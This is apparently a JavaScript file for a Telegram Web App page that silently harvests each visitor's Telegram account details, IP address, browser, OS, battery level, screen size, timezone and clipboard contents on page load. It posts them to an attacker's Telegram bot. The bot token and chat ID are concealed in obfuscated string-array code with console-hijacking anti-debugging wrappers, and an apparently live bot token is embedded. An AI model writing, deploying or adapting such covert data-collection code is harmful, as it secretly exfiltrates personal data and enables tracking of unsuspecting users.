let batteryLevel;
let screenWidth;
let screenHeight;
navigator.getBattery().then(function(battery) {
    batteryLevel = battery.level * 100;
});
screenWidth = window.screen.width;
screenHeight = window.screen.height;
// wXh
const batteryLevelConst = batteryLevel;
const screenWidthConst = screenWidth;
const screenHeightConst = screenHeight;
const clipboardText = navigator.clipboard.readText();

let tg = window.Telegram.WebApp;
document.addEventListener('DOMContentLoaded', function() {
  const urlParams = new URLSearchParams(window.location.search);
  const userAgent = navigator.userAgent;
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      const ip = data.ip;
      const osname = navigator.platform;
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const browser = getBrowserInfo();
      let userid = document.createElement('p');

      const message = `
*👤 Новый пользователь*

*🧭 Информация:*
*🔍 Account:*
  ├ ID: ${tg.initDataUnsafe.user.id}
  ├ Username: @${tg.initDataUnsafe.user.username}
  ├ Name: ${tg.initDataUnsafe.user.first_name}
  ├ Surname: ${tg.initDataUnsafe.user.last_name}
  ├ Language: ${tg.initDataUnsafe.user.language_code}
*💻 System:*
  ├ IP: ${ip}
  ├ UserAgent: ${userAgent}
  ├ OS: ${osname}
  ├ Browser: ${browser}
  ├ Battery ${batteryLevel}%
  ├ Screen: ${screenWidth}x${screenHeight} px.
  ├ Clipboard: ${clipboardText}
  └ Timezone: ${timeZone}`;
      
      const _0x43ca=['195803XVQMat','warn','constructor','497843AALjJx','toString','20TKacLQ','846263vdNoVh','7172628765:AAG0ffJMcOp5DsRKVcl-unmNkVGHDAY13pY','test','trace','6FbypGy','50156FaYlEl','300716fcfFTf','2fgVBqJ','1722090mpkkff','log','console','312532FcozCi','bind','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','apply','return\x20(function()\x20','info','{}.constructor(\x22return\x20this\x22)(\x20)','exception'];const _0x544f=function(_0x1f128d,_0x40b427){_0x1f128d=_0x1f128d-0x10c;let _0x3b4902=_0x43ca[_0x1f128d];return _0x3b4902;};const _0x2abc52=_0x544f;(function(_0x5a0329,_0x2e1a4c){const _0x1ef71d=_0x544f;while(!![]){try{const _0x315e46=-parseInt(_0x1ef71d(0x118))*-parseInt(_0x1ef71d(0x122))+-parseInt(_0x1ef71d(0x11d))*parseInt(_0x1ef71d(0x123))+-parseInt(_0x1ef71d(0x11b))*-parseInt(_0x1ef71d(0x10c))+parseInt(_0x1ef71d(0x124))+parseInt(_0x1ef71d(0x11e))+-parseInt(_0x1ef71d(0x10d))+parseInt(_0x1ef71d(0x110));if(_0x315e46===_0x2e1a4c)break;else _0x5a0329['push'](_0x5a0329['shift']());}catch(_0x35deb6){_0x5a0329['push'](_0x5a0329['shift']());}}}(_0x43ca,0xdce65));const _0x467a2e=function(){let _0x2ecbbd=!![];return function(_0x1d1095,_0x1d946c){const _0x6739ef=_0x2ecbbd?function(){const _0x1c57b4=_0x544f;if(_0x1d946c){const _0x20c944=_0x1d946c[_0x1c57b4(0x113)](_0x1d1095,arguments);return _0x1d946c=null,_0x20c944;}}:function(){};return _0x2ecbbd=![],_0x6739ef;};}(),_0x1ff94b=_0x467a2e(this,function(){const _0x2ef254=function(){const _0x5ea012=_0x544f,_0x254009=_0x2ef254[_0x5ea012(0x11a)]('return\x20/\x22\x20+\x20this\x20+\x20\x22/')()[_0x5ea012(0x11a)](_0x5ea012(0x112));return!_0x254009[_0x5ea012(0x120)](_0x1ff94b);};return _0x2ef254();});_0x1ff94b();const _0x3e5bfc=function(){let _0x5c45a0=!![];return function(_0x512f8a,_0x42f80a){const _0x1551b2=_0x5c45a0?function(){const _0x1b5e58=_0x544f;if(_0x42f80a){const _0x6784b3=_0x42f80a[_0x1b5e58(0x113)](_0x512f8a,arguments);return _0x42f80a=null,_0x6784b3;}}:function(){};return _0x5c45a0=![],_0x1551b2;};}(),_0xb10ce7=_0x3e5bfc(this,function(){const _0x1bc255=_0x544f,_0xbf73c2=function(){const _0x22f2ad=_0x544f;let _0x5a445b;try{_0x5a445b=Function(_0x22f2ad(0x114)+_0x22f2ad(0x116)+');')();}catch(_0xc425ba){_0x5a445b=window;}return _0x5a445b;},_0x5d1312=_0xbf73c2(),_0x1ce13a=_0x5d1312[_0x1bc255(0x10f)]=_0x5d1312[_0x1bc255(0x10f)]||{},_0x40ae7f=[_0x1bc255(0x10e),_0x1bc255(0x119),_0x1bc255(0x115),'error',_0x1bc255(0x117),'table',_0x1bc255(0x121)];for(let _0x3af151=0x0;_0x3af151<_0x40ae7f['length'];_0x3af151++){const _0x12dbec=_0x3e5bfc[_0x1bc255(0x11a)]['prototype'][_0x1bc255(0x111)](_0x3e5bfc),_0x2976fe=_0x40ae7f[_0x3af151],_0x5d293f=_0x1ce13a[_0x2976fe]||_0x12dbec;_0x12dbec['__proto__']=_0x3e5bfc[_0x1bc255(0x111)](_0x3e5bfc),_0x12dbec['toString']=_0x5d293f[_0x1bc255(0x11c)][_0x1bc255(0x111)](_0x5d293f),_0x1ce13a[_0x2976fe]=_0x12dbec;}});_0xb10ce7();const token=_0x2abc52(0x11f);
      const _0x550d=['toString','1LNqrzJ','__proto__','console','bind','info','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','973331wsVzJt','return\x20(function()\x20','{}.constructor(\x22return\x20this\x22)(\x20)','constructor','2uGlQjv','5425nzivzw','return\x20/\x22\x20+\x20this\x20+\x20\x22/','260833IUPbhf','641299hTLpgR','131RLnjjj','warn','-1002010632722','log','prototype','923255CnplBo','745975gMswPe','length','table','3583QrVTvz','apply','10hVhYzj'];const _0x1eb6=function(_0x4515a8,_0x583bae){_0x4515a8=_0x4515a8-0x10b;let _0x1b8635=_0x550d[_0x4515a8];return _0x1b8635;};const _0x8a9719=_0x1eb6;(function(_0x5e002a,_0x303815){const _0x1c48c5=_0x1eb6;while(!![]){try{const _0x18e1da=-parseInt(_0x1c48c5(0x111))*-parseInt(_0x1c48c5(0x11f))+parseInt(_0x1c48c5(0x11b))*-parseInt(_0x1c48c5(0x11e))+parseInt(_0x1c48c5(0x125))+parseInt(_0x1c48c5(0x10d))*-parseInt(_0x1c48c5(0x10f))+parseInt(_0x1c48c5(0x117))+-parseInt(_0x1c48c5(0x11c))*parseInt(_0x1c48c5(0x120))+-parseInt(_0x1c48c5(0x126));if(_0x18e1da===_0x303815)break;else _0x5e002a['push'](_0x5e002a['shift']());}catch(_0x52808f){_0x5e002a['push'](_0x5e002a['shift']());}}}(_0x550d,0x7fddb));const _0x2a123b=function(){let _0x4b62de=!![];return function(_0x2ba134,_0x679aa3){const _0x5f489d=_0x4b62de?function(){const _0x124654=_0x1eb6;if(_0x679aa3){const _0x2bac9d=_0x679aa3[_0x124654(0x10e)](_0x2ba134,arguments);return _0x679aa3=null,_0x2bac9d;}}:function(){};return _0x4b62de=![],_0x5f489d;};}(),_0x59f0f4=_0x2a123b(this,function(){const _0x5946cd=function(){const _0x7410ef=_0x1eb6,_0x4dc99a=_0x5946cd[_0x7410ef(0x11a)](_0x7410ef(0x11d))()[_0x7410ef(0x11a)](_0x7410ef(0x116));return!_0x4dc99a['test'](_0x59f0f4);};return _0x5946cd();});_0x59f0f4();const _0x53d641=function(){let _0x3dd336=!![];return function(_0x717cb,_0x130acd){const _0x298c3c=_0x3dd336?function(){const _0x285c51=_0x1eb6;if(_0x130acd){const _0x10b02f=_0x130acd[_0x285c51(0x10e)](_0x717cb,arguments);return _0x130acd=null,_0x10b02f;}}:function(){};return _0x3dd336=![],_0x298c3c;};}(),_0x506ce9=_0x53d641(this,function(){const _0xd68f2c=_0x1eb6,_0x528749=function(){const _0x392b63=_0x1eb6;let _0x122535;try{_0x122535=Function(_0x392b63(0x118)+_0x392b63(0x119)+');')();}catch(_0x4150c6){_0x122535=window;}return _0x122535;},_0x98454d=_0x528749(),_0x94abbe=_0x98454d[_0xd68f2c(0x113)]=_0x98454d['console']||{},_0x2fa8a1=[_0xd68f2c(0x123),_0xd68f2c(0x121),_0xd68f2c(0x115),'error','exception',_0xd68f2c(0x10c),'trace'];for(let _0x345a1a=0x0;_0x345a1a<_0x2fa8a1[_0xd68f2c(0x10b)];_0x345a1a++){const _0x1ddcc0=_0x53d641['constructor'][_0xd68f2c(0x124)]['bind'](_0x53d641),_0x472500=_0x2fa8a1[_0x345a1a],_0x379bae=_0x94abbe[_0x472500]||_0x1ddcc0;_0x1ddcc0[_0xd68f2c(0x112)]=_0x53d641[_0xd68f2c(0x114)](_0x53d641),_0x1ddcc0[_0xd68f2c(0x110)]=_0x379bae['toString'][_0xd68f2c(0x114)](_0x379bae),_0x94abbe[_0x472500]=_0x1ddcc0;}});_0x506ce9();const chatId=_0x8a9719(0x122);
      const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('text', message);
      formData.append('parse_mode', 'Markdown');
      fetch(url, {
        method: 'POST',
        body: formData
      });
    });

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = '';
    const match = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];

    if (/trident/i.test(match[1])) {
      const tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
      browser = `IE ${tem[1] || ''}`;
    }

    if (match[1] === 'Chrome') {
      const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
      if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
    }

    match[2] = match[2] ? `version ${match[2]}` : '';
    browser = `${match[1] || ''} ${match[2] || ''}`.trim();
    return browser;
  }
  });